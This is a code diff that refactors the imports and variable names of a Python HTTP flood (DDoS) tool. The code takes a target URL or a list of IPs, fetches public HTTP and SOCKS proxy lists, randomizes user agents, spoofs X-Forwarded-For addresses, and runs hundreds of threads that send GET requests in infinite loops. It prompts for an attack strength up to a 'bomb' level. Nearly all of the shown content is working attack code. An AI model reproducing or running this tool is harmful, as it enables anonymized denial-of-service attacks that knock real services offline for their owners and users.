@@ -1,10 +1,10 @@
-import socket
-import traceback
-import socks
-import threading
-import random
-import requests
-import re
+from socket import socket, AF_INET, SOCK_STREAM
+from traceback import print_exc
+from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5, PROXY_TYPE_SOCKS4
+from threading import Thread
+from random import choice, randint
+from requests import get
+from re import split, match
 from concurrent.futures import ThreadPoolExecutor
 
 red = "\033[1;91m"
@@ -28,13 +28,13 @@ print(f'''
 	''')  # The graphics are there
 
 
-useragents = open('headers.txt', 'r+').read().splitlines()
+useragents = open('headers.txt', 'r+').readlines()
 
-http_proxies = requests.get(
+http_proxies = get(
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.split("\n")
-socks4_proxy = requests.get(
+socks4_proxy = get(
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt").text.split("\n")
-socks5_proxy = requests.get(
+socks5_proxy = get(
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text.split("\n")
 
 
@@ -42,7 +42,7 @@ def Main_Menu():  # in This Function Septum The Url To Make It Usable For The Fu
     global url
     global url2
     global urlport
-    global choice
+    global chosen
     global ips
     global threads
     global multiple
@@ -59,26 +59,26 @@ def Main_Menu():  # in This Function Septum The Url To Make It Usable For The Fu
     print("\033[92m")
 
     try:
-        while True:
+        while 1:
             try:
-                choice = int(input(f"\n{green}Do you want one target [0] or more[1] > {end}"))
+                chosen = int(input(f"\n{green}Do you want one target [0] or more[1] > {end}"))
             except ValueError:
                 print(f"{red}Use integers Only!!!{end}")
-            if choice == 1:
+            if chosen == 1:
                 ip_file = input(f"{green}Insert txt file of ips > {end}")
-                ips = open(ip_file).readlines()
+                ips = open(ip_file, "r").readlines()
                 break
-            elif choice == 0:
-                while True:             # Automatically detect whether input is IP or URL
+            elif chosen == 0:
+                while 1:             # Automatically detect whether input is IP or URL
                     url = input(f"\n{green}Please Enter URL/IPv4 Address: {end}").strip()
-                    if re.match(URL_REGEX, url):
+                    if match(URL_REGEX, url):
                         break
-                    elif re.match(IP_REGEX, url):
+                    elif match(IP_REGEX, url):
                         break
                     else:
                         print(f"{red}Pattern Error, please enter correct URL/IPv4 Address{end}")
 
-                url2 = re.split(r"://", url)[1]
+                url2 = split(r"://", url)[1]
 
                 try:
                     urlport = url.split(":")[2] # directly get port if exist
@@ -94,12 +94,12 @@ def Main_Menu():  # in This Function Septum The Url To Make It Usable For The Fu
     except Exception as e:  # If something goes wrong
         print(f"{red}Error: {e}{end}")
 
-    while True:
+    while 1:
         anonymous = input("\nDo you want to use SOCKS4/5 or proxy [y/n] > ").lower()
         if anonymous == "y":
             use_proxy = True
             try:
-                while True:
+                while 1:
                     type = int(input(f"{green}Choose [0] for SOCKS4/5 or [1] proxy > "))
                     if type == 0:
                         socks_mode = True
@@ -123,7 +123,7 @@ def Main_Menu():  # in This Function Septum The Url To Make It Usable For The Fu
                 print(f"{red}please enter integers only;") 
             break
 
-        elif choice == "n":
+        elif chosen == "n":
             use_proxy = False
             break
 
@@ -136,7 +136,7 @@ def Main_Menu():  # in This Function Septum The Url To Make It Usable For The Fu
         threads = 800
         print("800 threads selected.\n")
 
-    while True:
+    while 1:
         try:
             multiple = int(input(f"{green}Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: {end}"))
             break
@@ -199,7 +199,7 @@ def start_attack():
                     print(f"{ThreadPool._max_workers} Threads initialized")
                 #This starts threads as soon as they are all ready
     except Exception as e:
-        print(traceback.print_exc())
+        print(print_exc())
 
 class RequestProxyHTTP:  #The Multithreading class
 
@@ -208,25 +208,25 @@ class RequestProxyHTTP:  #The Multithreading class
 
     def launch(self):# the function that gives the instructions to the various threads
         useragent = "User-Agent: " + \
-            random.choice(useragents) + "\r\n"  # scelta useragent a caso
-        accept = random.choice(acceptall)  # scelta header accept a caso
-        randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
-            "." + str(random.randint(0, 255)) + "." + \
-            str(random.randint(0, 255))
+            choice(useragents) + "\r\n"  # scelta useragent a caso
+        accept = choice(acceptall)  # scelta header accept a caso
+        randomip = str(randint(0, 255)) + "." + str(randint(0, 255)) + \
+            "." + str(randint(0, 255)) + "." + \
+            str(randint(0, 255))
         # X-forward-for, a HTTP Header that allows you to increase anonymity (see Google for info)
         forward = "X-Forwarded-For: " + randomip + "\r\n"
-        if choice == "1":
-            ip = random.choice(ips)
+        if chosen == "1":
+            ip = choice(ips)
             get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
         else:
             get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
         request = get_host + useragent + accept + forward + connection + "\r\n" # Here is the Final Request
         # wait for threads to be ready
-        while True:  # infinite loop
-            proxy = random.choice(anonymity).strip().split(":")
+        while 1:  # infinite loop
+            proxy = choice(anonymity).strip().split(":")
             try:
                 # Here is our socket
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s = socket(AF_INET, SOCK_STREAM)
                 # connection to the proxy
                 s.connect((str(proxy[0]), int(proxy[1])))
                 #Encode In Bytes Della Richiest a HTTP
@@ -250,22 +250,22 @@ class RequestSocksHTTP:# The Multithreading class
 
     def launch(self):  # the function that gives the instructions to the various threads
         useragent = "User-Agent: " + \
-            random.choice(useragents) + "\r\n"  # READY PROXY CHOICE
-        accept = random.choice(acceptall) # CHOICE CHOICE A random
-        if choice == "1":
-            ip = random.choice(ips)
+            choice(useragents) + "\r\n"  # READY PROXY CHOICE
+        accept = choice(acceptall) # CHOICE CHOICE A random
+        if chosen == "1":
+            ip = choice(ips)
             get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
         else:
             get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
         request = get_host + useragent + accept + \
             connection + "\r\n" # Final Request Composition      
         # wait for threads to be ready
-        while True:
-            proxy = random.choice(anonymity).strip().split(":")
+        while 1:
+            proxy = choice(anonymity).strip().split(":")
             try:
-                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(
+                setdefaultproxy(PROXY_TYPE_SOCKS5, str(proxy[0]), int(
                     proxy[1]), True)  # Command to Proxat us with the SOCKS
-                s = socks.socksocket() # Socket creation with pysocks
+                s = socksocket() # Socket creation with pysocks
                 s.connect((str(url2), int(urlport)))  # connection
                 s.send(str.encode(request)) # Send
                 #PrintReq +Counter
@@ -279,9 +279,9 @@ class RequestSocksHTTP:# The Multithreading class
             except: # If something goes wrong, this Except closes the socket and connects to the Try below
                 s.close() # Closes Socket
                 try: # the Try tries to see if the error is caused by the type of Errata SOCKS, in fact try with SOCKS4
-                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(
+                    setdefaultproxy(PROXY_TYPE_SOCKS4, str(
                         proxy[0]), int(proxy[1]), True)# Test with SOCKS4
-                    s = socks.socksocket() # Creation New Socket
+                    s = socksocket() # Creation New Socket
                     s.connect((str(url2), int(urlport))) # connection
                     s.send(str.encode(request)) # Send
                     # print req + counter
@@ -302,25 +302,25 @@ class RequestSocksHTTP:# The Multithreading class
 class RequestDefaultHTTP: # The Multithreading class
 
     def __init__(self, counter): # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
-        threading.Thread.__init__(self)
+        Thread.__init__(self)
         self.counter = counter
 
     def launch(self): # the function that gives the instructions to the various threads
         useragent = "User-Agent: " + \
-            random.choice(useragents) + "\r\n" # Useragent Case
-        accept = random.choice(acceptall)  # accept a case
-        if choice == "1":
-            ip = random.choice(ips)
+            choice(useragents) + "\r\n" # Useragent Case
+        accept = choice(acceptall)  # accept a case
+        if chosen == "1":
+            ip = choice(ips)
             get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
         else:
             get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
         request = get_host + useragent + accept + \
             connection + "\r\n"  #Final Request composition
         #wait for threads to be ready        
-        while True:
+        while 1:
             try:
                 # socket creation
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s = socket(AF_INET, SOCK_STREAM)
                 s.connect((str(url2), int(urlport)))  #connection
                 s.send(str.encode(request))  #sending
                 print("Request sent! @", self.counter)  # printReq +Counter
